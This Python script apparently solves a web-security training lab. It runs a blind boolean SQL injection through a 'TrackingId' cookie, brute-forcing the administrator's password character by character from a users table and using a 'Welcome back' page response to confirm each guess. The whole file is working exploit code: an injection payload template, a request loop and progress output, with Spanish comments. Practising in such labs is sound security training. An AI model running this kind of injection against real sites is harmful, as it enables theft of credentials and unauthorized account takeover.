from termcolor import colored
import requests
import sys
import signal
import string
import time
from pwn import log

# Variables globales
p1 = None
p2 = None
password = ""

def def_handler(sig, frame):
    print(colored("\n\n[! Saliendo...]\n", "red"))
    if p1:
        p1.failure("Ataque detenido por el usuario")
    sys.exit(1)

# Registrar handler
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

def makeSQLI():
    global p1, p2, password
    password = ""  # Reiniciar

    p1 = log.progress("SQLI")
    p2 = log.progress("Password")

    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(1)

    for position in range(1, 21):
        found = False
        for character in characters:
            cookies = {
                'TrackingId': f"MvOj8narJjYLAYaQ' AND (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{character}'-- -",
                'session': "VyEdGMgLdTnjYhnXo9xKeH3fVZ5KPNi0"
            }

            p1.status(f"Probando posición {position}: {character}")

            try:
                r = requests.get(
                    "https://0ab1007e0498e69a8311dc19001f003d.web-security-academy.net",
                    cookies=cookies,
                    timeout=10
                )
            except requests.RequestException as e:
                p1.failure(f"Error de conexión: {e}")
                sys.exit(1)

            if "Welcome back" in r.text:
                password += character
                p2.status(password)
                found = True
                break  # Sale del bucle de caracteres

        if not found:
            p1.success("Contraseña encontrada (posición vacía)")
            p2.success(password)
            print(colored(f"\n[+] Contraseña del administrador: {password}", "green"))
            return

        time.sleep(0.5)  # Rate limiting

    # Si llega aquí, completó 20 caracteres
    p1.success("Contraseña completa!")
    p2.success(password)
    print(colored(f"\n[+] Contraseña del administrador: {password}", "green"))

if __name__ == '__main__':
    makeSQLI()
